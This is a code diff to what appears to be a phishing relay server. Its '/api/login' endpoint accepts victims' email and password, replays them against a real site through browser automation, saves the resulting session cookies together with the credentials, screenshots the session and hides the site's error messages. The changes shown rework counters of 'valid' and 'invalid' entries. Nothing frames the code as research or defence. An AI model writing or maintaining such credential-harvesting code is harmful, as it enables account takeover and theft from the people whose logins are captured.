@@ -365,7 +365,7 @@ app.post('/api/login', async (req, res) => {
     try {
         const { email, password, sessionId: requestedSessionId } = req.body;
 
-        // Track visit - every login attempt
+        // Track visit
         analytics.totalVisits++;
 
         if (!email) {
@@ -440,6 +440,7 @@ app.post('/api/login', async (req, res) => {
 
                 // If password login successful, save cookies but don't use them
                 if (loginSuccess) {
+                    analytics.validEntries++;
                     console.log('💾 Saving session cookies to file (not for reuse)...');
                     const sessionFile = await session.automation.saveCookies(email, password);
                     
@@ -480,10 +481,8 @@ app.post('/api/login', async (req, res) => {
             // Take screenshot after login attempt
             session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);
 
-            // Track login results
-            if (loginSuccess) {
-                analytics.validEntries++;
-            } else {
+            // Track failed login attempts
+            if (!loginSuccess) {
                 analytics.invalidEntries++;
             }
 
@@ -569,7 +568,7 @@ app.post('/api/login', async (req, res) => {
                                     siteReport.errorMessages.push(errorText.trim());
                                     console.log(`Found error message: ${errorText.trim()}`);
                                     foundAccountNotFoundError = true;
-                                    // Don't increment here - will be counted as invalid at the end if no success
+                                    analytics.invalidEntries++;
                                 } else {
                                     // Remove all other bordered error messages from HTML
                                     await element.evaluate(el => el.remove());
@@ -644,14 +643,6 @@ app.post('/api/login', async (req, res) => {
                 console.error('Error during email/next process:', error);
                 siteReport.errorMessages.push(`Automation error: ${error.message}`);
                 siteReport.siteResponse = `Error occurred: ${error.message}`;
-            }
-
-            // Track analytics for email-only attempts
-            if (siteReport.errorMessages.length > 0) {
-                analytics.invalidEntries++;
-            } else if (siteReport.needsPassword) {
-                // Valid email that exists - count as valid entry
-                analytics.validEntries++;
             }
 
             res.json({
